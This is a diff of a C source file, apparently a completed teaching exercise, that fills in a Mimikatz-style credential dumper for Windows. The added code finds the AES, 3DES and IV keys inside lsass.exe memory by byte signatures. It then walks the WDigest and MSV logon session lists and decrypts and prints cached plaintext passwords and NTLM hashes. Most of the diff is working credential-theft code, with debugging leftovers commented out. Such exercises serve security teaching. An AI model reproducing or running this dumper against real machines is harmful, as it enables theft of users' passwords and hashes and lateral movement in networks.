@@ -20,7 +20,7 @@ HANDLE g_hLsass = 0;
  *         以下的函数均无需额外修改可直接调用           *
  *****************************************************/
 
-/// 查找并返回 lsass.exe 进程的PID
+ /// 查找并返回 lsass.exe 进程的PID
 DWORD GetLsassPid() {
 
 	PROCESSENTRY32 entry = { 0 };
@@ -72,7 +72,7 @@ VOID PrepareUnprotectLsassMemoryKeys() {
 /// 在由 mem 指针指向的内存区域 [mem,mem+0x200000] 中搜索字节序列 signature 首次出现的偏移，并返回
 DWORD SearchPattern(IN PUCHAR mem, IN PUCHAR signature, IN DWORD signatureLen) {
 	for (DWORD offset = 0; offset < 0x200000; offset++)
-		if (mem[offset] == signature[0] && mem[offset+1] == signature[1])
+		if (mem[offset] == signature[0] && mem[offset + 1] == signature[1])
 			if (memcmp(mem + offset, signature, signatureLen) == 0)
 				return offset;
 	return 0;
@@ -174,21 +174,26 @@ VOID FreeUnicodeString(UNICODE_STRING* unicode) {
 
 
 
-/*****************************************************
- *  请将以下的三个函数填写完整，并实现对应的功能         *
- *    - LocateUnprotectLsassMemoryKeys               *
- *	  - GetCredentialsFromMSV                        *
- *	  - GetCredentialsFromWdigest                    *
- *****************************************************/
+ /*****************************************************
+  *  请将以下的三个函数填写完整，并实现对应的功能         *
+  *    - LocateUnprotectLsassMemoryKeys               *
+  *	  - GetCredentialsFromMSV                        *
+  *	  - GetCredentialsFromWdigest                    *
+  *****************************************************/
 
-/// 从 lsass.exe 内存中读取出后续对凭据进行AES解密或是3DES解密使用的密钥
-/// 设置相应的全局变量 g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
-/// 推荐API: SearchPattern() ReadFromLsass()
+  /// 从 lsass.exe 内存中读取出后续对凭据进行AES解密或是3DES解密使用的密钥
+  /// 设置相应的全局变量 g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
+  /// 推荐API: SearchPattern() ReadFromLsass()
 VOID LocateUnprotectLsassMemoryKeys() {
 	DWORD keySigOffset = 0;
 	DWORD aesOffset = 0;
+	DWORD desOffset = 0;
+	DWORD ivOffset = 0;
 	KIWI_BCRYPT_HANDLE_KEY hAesKey;
+	KIWI_BCRYPT_HANDLE_KEY h3DesKey;
 	KIWI_BCRYPT_KEY81 extractedAesKey;
+	KIWI_BCRYPT_KEY81 extractedDesKey;
+	BYTE extractedIV[16] = { 0 };
 	PVOID keyPointer = NULL;
 
 	// 将lsass.exe所加载的模块lsasrv.dll加载入当前进程的内存空间中
@@ -199,9 +204,9 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// lsasrv.dll 模块中的全局变量 hAesKey 是一个指向实际AES密钥的结构体指针，接下来定位hAesKey在lsass.exe进程中的地址
 
 	// 以下硬编码的字节序列签名在Windows 10与Windows 11上测试可用，非Win10、Win11可能失效
-	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 
-						0x48, 0x8d, 0x45, 0xe0, 
-						0x44, 0x8b, 0x4d, 0xd8, 
+	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
+						0x48, 0x8d, 0x45, 0xe0,
+						0x44, 0x8b, 0x4d, 0xd8,
 						0x48, 0x8d, 0x15 };
 
 	// lsasrv.dll 中 keyAESSig 字节序列所对应的指令反汇编，其中 99 2C 10 00 (小端数 0x102c99)
@@ -220,7 +225,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	keySigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
 	printf("keySigOffset = 0x%x\n", keySigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
 	if (keySigOffset == 0) return;
-	
+
 	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig 上读取4字节的偏移
 	//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
 	// *(DWORD *)(0x1800752bb) = 0x102c99
@@ -238,12 +243,12 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// 所读取的8字节的数据是一个指向结构体 KIWI_BCRYPT_HANDLE_KEY 的指针
 	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
 	printf("keyPointer = 0x%p\n", keyPointer); // 形如 0x000002318B910230
-	                                           //                       ^ 由于内存以16字节对齐，故最后4bit必为0
+	//                       ^ 由于内存以16字节对齐，故最后4bit必为0
 
-	// 从lsass进程的内存位置 keyPointer 读取出结构题的实际内容
-	// 由于 keyPointer 未知，该实际内容已无法使用IDA Pro通过静态分析得到
+// 从lsass进程的内存位置 keyPointer 读取出结构题的实际内容
+// 由于 keyPointer 未知，该实际内容已无法使用IDA Pro通过静态分析得到
 	ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
-	
+
 	// 读取 KIWI_BCRYPT_HANDLE_KEY 结构体中类型为 PKIWI_BCRYPT_KEY81 的成员变量指针所指向的 KIWI_BCRYPT_KEY81 结构体
 	// AES DES 密钥均使用 KIWI_BCRYPT_KEY81 结构体包裹
 	ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));
@@ -258,6 +263,53 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// 请继续定位全局变量 h3DesKey InitializationVector 所相关的密钥参数
 	// 填入全局变量 g_sekurlsa_IV g_sekurlsa_3DESKey 中
 	// ~ 30 lines of code
+	UCHAR keyDESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
+						0x48, 0x8d, 0x45, 0xe0,
+						0x44, 0x8b, 0x4d, 0xd4,
+						0x48, 0x8d, 0x15 };
+
+	keySigOffset = SearchPattern(lsasrvBaseAddress, keyDESSig, sizeof keyDESSig);
+	printf("keySigOffset = 0x%x\n", keySigOffset);
+	if (keySigOffset == 0) return;
+
+	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyDESSig, &desOffset, sizeof desOffset);
+	printf("desOffset = 0x%x\n", desOffset);
+
+	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyDESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
+	printf("keyPointer = 0x%p\n", keyPointer);
+
+	ReadFromLsass(keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
+
+	ReadFromLsass(h3DesKey.key, &extractedDesKey, sizeof(KIWI_BCRYPT_KEY81));
+
+	memcpy(g_sekurlsa_3DESKey, extractedDesKey.hardkey.data, extractedDesKey.hardkey.cbSecret);
+
+	printf("DES Key Located (len %d): ", extractedDesKey.hardkey.cbSecret);
+	HexdumpBytesPacked(extractedDesKey.hardkey.data, extractedDesKey.hardkey.cbSecret);
+	puts("");
+
+	UCHAR keyIVSig[] = { 0x8b, 0xd8,
+						0x85, 0xc0,
+						0x78, 0x4d,
+						0x44, 0x8d, 0x4e, 0xf2,
+						0x44, 0x8b, 0xc6,
+						0x48, 0x8d, 0x15 };
+
+	keySigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
+	printf("keySigOffset = 0x%x\n", keySigOffset);
+	if (keySigOffset == 0) return;
+
+	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
+	printf("ivOffset = 0x%x\n", ivOffset);
+
+	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyIVSig + 4 + ivOffset, &extractedIV, sizeof extractedIV);
+
+	memcpy(g_sekurlsa_IV, extractedIV, sizeof extractedIV);
+
+	//	printf("IV Located (len %d): ", AES_128_KEY_LENGTH);
+	//	HexdumpBytesPacked(keyPointer, AES_128_KEY_LENGTH);
+	//	puts("");
+
 }
 
 /// 导出Wdigest缓存在内存中的明文密码
@@ -270,16 +322,25 @@ VOID GetCredentialsFromWdigest() {
 
 	// 仿照LocateUnprotectLsassMemoryKeys中的步骤
 	// 定位wdigest.dll模块中的全局变量 l_LogSessList 
-	//
-	// 
-	// 
-	// 
-	// 
-	// 
-	// 
-	// ~ 5 lines of code 
-	
+	// ~ 5 lines of code
+	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");
+	UCHAR logSessSig[] = {0x48, 0xff, 0x15, 0xe6, 0x5c, 0x01, 0x00, 
+						0x0f, 0x1f, 0x44, 0x00, 0x00,
+						0x48, 0x8b, 0x1d, 0x3a, 0xd1, 0x01, 0x00,
+						0x48, 0x8d, 0x0d };
+
+	logSessListSigOffset = SearchPattern(wdigestBaseAddress, logSessSig, sizeof logSessSig);
+	printf("logSessListSigOffset = 0x%x\n", logSessListSigOffset);
+	if (logSessListSigOffset == 0) return;
+
+	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof logSessSig, &logSessListOffset, sizeof logSessListOffset);
+	printf("logSessListOffset = 0x%x\n", logSessListOffset);
+
+	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof logSessSig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
+	printf("logSessListAddr = 0x%p\n", logSessListAddr);
+
 	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
+	printf("entry = 0x%p\n", entry);
 
 	llCurrent = (PUCHAR)entry.This;
 
@@ -293,7 +354,7 @@ VOID GetCredentialsFromWdigest() {
 		if (entry.UsageCount == 1) {
 			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)));
 			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(llCurrent + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)));
-			
+
 			if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
 			else printf("Username: [NULL]\n");
 
@@ -301,9 +362,23 @@ VOID GetCredentialsFromWdigest() {
 			if (password->Length != 0 && (password->Length % 2) == 0) {
 				// Decrypt password using recovered AES/3Des keys and IV
 				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
-					printf("Password: %s\n\n", passDecrypted);
+					/*int len = sizeof(passDecrypted) / sizeof(char);
+					for (int i = 0; i < len - 1; i++) {
+						if (passDecrypted[i] == '\0') {
+							if (passDecrypted[i + 1] == '\0')
+								break;
+							for (int j = i; j < len - 1; j++) {
+								passDecrypted[j] = passDecrypted[j + 1];
+							}
+							passDecrypted[len - 1] = '\0';
+							len--;
+							i--;
+						}
+					}*/
+					wprintf(L"Password: %ls\n\n", (wchar_t*)passDecrypted);
 				}
-			} else {
+			}
+			else {
 				printf("Password: [NULL]\n\n");
 			}
 
@@ -329,18 +404,137 @@ VOID GetCredentialsFromMSV() {
 	//
 	// ~ 10 lines of code 
 	//
+	DWORD LogonSessionListSigOffset, LogonSessionListOffset;
+	PUCHAR LogonSessionListAddr = 0;
+	LIST_ENTRY LogonSessionList;
+	unsigned char passDecrypted[1024];
+	PUCHAR lsasvrBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
+	UCHAR LogonSessionListSig[] = { 0x0f, 0x1f, 0x44, 0x00, 0x00,
+									0x8b, 0xc7,
+									0x48, 0xc1, 0xe0, 0x04,
+									0x48, 0x8d, 0x0d };
+
+	LogonSessionListSigOffset = SearchPattern(lsasvrBaseAddress, LogonSessionListSig, sizeof LogonSessionListSig);
+	printf("LogonSessionListSigOffset = 0x%x\n", LogonSessionListSigOffset);
+	if (LogonSessionListSigOffset == 0) return;
+
+	ReadFromLsass(lsasvrBaseAddress + LogonSessionListSigOffset + sizeof LogonSessionListSig, &LogonSessionListOffset, sizeof LogonSessionListOffset);
+	printf("LogonSessionListOffset = 0x%x\n", LogonSessionListOffset);
+
+	ReadFromLsass(lsasvrBaseAddress + LogonSessionListSigOffset + sizeof LogonSessionListSig + 4 + LogonSessionListOffset, &LogonSessionList, sizeof(LIST_ENTRY));
+	ReadFromLsass(lsasvrBaseAddress + LogonSessionListSigOffset + sizeof LogonSessionListSig + 4 + LogonSessionListOffset, &LogonSessionListAddr, sizeof LogonSessionListAddr);
+
+
+	PKIWI_MSV1_0_LIST_63  LogonSessionListptr = LogonSessionList.Flink;
+	//ReadFromLsass(LogonSessionList.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
+	printf("LogonSessionListptr = 0x%p\n", LogonSessionListptr);
+
+	//KIWI_MSV1_0_LIST_63 LogonSessionList_First = *(LogonSessionListptr);
+	KIWI_MSV1_0_LIST_63 LogonSessionList_First;
+	ReadFromLsass(LogonSessionListptr, &LogonSessionList_First, sizeof(KIWI_MSV1_0_LIST_63));
+	//ReadFromLsass(LogonSessionList_First.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
+	//printf("LogonSessionListptr = 0x%p\n", LogonSessionListptr);
+
+	//ReadFromLsass(LogonSessionListptr, &LogonSessionList_First, sizeof(KIWI_MSV1_0_LIST_63));
+	//ReadFromLsass(LogonSessionList_First.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
+	//printf("LogonSessionListptr = 0x%p\n", LogonSessionListptr);
+
+	//UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&LogonSessionListptr->UserName));
+	//UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&(LogonSessionList_First.UserName)));
+	//UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&((*LogonSessionListptr).UserName)));
+	//if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
+	//else printf("Username: [NULL]\n");
 
 	do {
-		PBYTE ptr = NULL; // ...
-		KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData = { 0 };
-		sessionData.UserName = (PUNICODE_STRING)(ptr + helper.offsetToUsername);
-		sessionData.pCredentials = *(PVOID*)(ptr + helper.offsetToCredentials);
+		//PBYTE ptr = (PBYTE)LogonSessionListptr; // ...
+		//KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData = { 0 };
+		//sessionData.UserName = (PUNICODE_STRING)(ptr + helper.offsetToUsername);
+		//sessionData.pCredentials = *(PVOID*)(ptr + helper.offsetToCredentials);
 		KIWI_MSV1_0_CREDENTIALS credentials;
 		KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
+		PKIWI_MSV1_0_CREDENTIALS pcredentials;
+		PKIWI_MSV1_0_PRIMARY_CREDENTIALS pprimaryCredentials;
+		PMSV1_0_PRIMARY_CREDENTIAL_10_1607  pBuffer;
 
 		//
 		// ~ 10 lines of code
 		//
+		UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(&((*LogonSessionListptr).UserName)));
+		if (username != NULL && username->Length != 0) printf("Username: %ls\n", username->Buffer);
+		else printf("Username: [NULL]\n");
+		printf("UserName = 0x%p\n", &((*LogonSessionListptr).UserName));
+		printf("Credentials = 0x%p\n", &((*LogonSessionListptr).Credentials));
 
-	} while (TRUE);
+		//PKIWI_MSV1_0_CREDENTIALS pcredentials = (*LogonSessionListptr).Credentials;
+		//printf("pcredentials = 0x%p\n", pcredentials);
+		//ReadFromLsass((*LogonSessionListptr).Credentials, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
+		//ReadFromLsass(credentials.PrimaryCredentials, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
+		ReadFromLsass(&((*LogonSessionListptr).Credentials), &pcredentials, sizeof(PKIWI_MSV1_0_CREDENTIALS));
+		//ReadFromLsass(pcredentials, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
+		printf("pcredentials = 0x%p\n", pcredentials);
+
+		//why?????
+		//pcredentials = (*LogonSessionListptr).Credentials;
+		//printf("pcredentials = 0x%p\n", pcredentials);
+		
+		//ReadFromLsass(pprimaryCredentials, &primaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));
+
+		ReadFromLsass(&((*pcredentials).PrimaryCredentials), &pprimaryCredentials, sizeof(PKIWI_MSV1_0_PRIMARY_CREDENTIALS));
+		printf("pprimaryCredentials = 0x%p\n", pprimaryCredentials);
+		//UNICODE_STRING* bBuffer = ExtractUnicodeString((PUNICODE_STRING)(&((*pprimaryCredentials).Primary)));
+		//printf("pprimaryCredentials.C = 0x%s\n", (char*)bBuffer->Buffer);
+		//ReadFromLsass(&((*pprimaryCredentials).Credentials.Buffer), &pBuffer, sizeof(PMSV1_0_PRIMARY_CREDENTIAL_10_1607));
+		//printf("pBuffer = 0x%p\n", pBuffer);
+
+		//BYTE* NTLM = (*pBuffer).NtOwfPassword;
+		//printf("NTLM = 0x%p\n", NTLM);
+		//UNICODE_STRING* NTLM = ExtractUnicodeString((PUNICODE_STRING)&(primaryCredentials.Credentials));
+		UNICODE_STRING* SBuffer = ExtractUnicodeString((PUNICODE_STRING)(&((*pprimaryCredentials).Credentials)));
+		//UNICODE_STRING* SBuffer = ExtractUnicodeString((PUNICODE_STRING)(pprimaryCredentials+0x28));
+		if (SBuffer != NULL && SBuffer->Length != 0) {
+			if (DecryptCredentials((char*)SBuffer->Buffer, SBuffer->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
+				
+				PMSV1_0_PRIMARY_CREDENTIAL_10_1607 abc = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607) passDecrypted;
+				BYTE *ab = abc->NtOwfPassword;
+
+				int len = sizeof(abc->NtOwfPassword) / sizeof(abc->NtOwfPassword[0]);
+
+				printf("NTLM: ");
+				printf("0x");
+				for (int i = 0; i < len; i++) {
+					printf("%02x", abc->NtOwfPassword[i]);
+				}
+				printf("\n\n");
+
+				//wprintf(L"NTLM: %ls\n\n", (wchar_t*)(passDecrypted));
+				//printf("NTLM: %s\n\n", passDecrypted);
+			}
+		}
+		else printf("NTLM: \n\n\n");
+
+		//credentials = *(KIWI_MSV1_0_CREDENTIALS*)sessionData.pCredentials;
+		//primaryCredentials = *(credentials.PrimaryCredentials);
+
+	//	if (msvCredentials = (PBYTE)primaryCredentials.Credentials.Buffer) {
+	//		if (*(PBOOLEAN)(msvCredentials + 0x4a)) {
+	//			wprintf(L"\n\t * LM       : ");
+	//			UNICODE_STRING* LM = ExtractUnicodeString((PUNICODE_STRING)(msvCredentials + 0x4a));
+	//			if (LM->Length != 0) {
+	//				if (DecryptCredentials((char*)LM->Buffer, LM->MaximumLength, passDecrypted, sizeof(passDecrypted)) > 0) {
+	//					wprintf(L"LM: %ls\n\n", (wchar_t*)passDecrypted);
+	//				}
+	//			}
+	//			else {
+	//				printf("LM: [NULL]\n\n");
+	//			}
+	//			FreeUnicodeString(LM);
+	//		}
+	//	}
+
+		FreeUnicodeString(username);
+		FreeUnicodeString(SBuffer);
+
+		ReadFromLsass(LogonSessionList_First.Flink, &LogonSessionListptr, sizeof(PKIWI_MSV1_0_LIST_63));
+		ReadFromLsass(LogonSessionListptr, &LogonSessionList_First, sizeof(KIWI_MSV1_0_LIST_63));
+	} while (LogonSessionListptr != LogonSessionListAddr);
 }
